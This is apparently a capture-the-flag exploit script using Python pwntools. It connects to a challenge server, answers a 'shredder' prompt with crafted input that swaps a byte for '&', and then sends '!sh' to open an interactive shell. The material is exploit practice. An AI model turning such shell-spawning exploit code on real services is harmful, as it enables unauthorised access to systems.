from pwn import *

r = remote('ctf.pwn.sg', 4020)

r.recvuntil('Here comes the shredder! (/usr/bin/shred ')
fil = r.recvuntil(')', drop=True)
print(fil)
r.sendline('11')
r.sendline(hex(ord('&'))[2:])
pause()
r.sendline('!sh')

r.interactive()


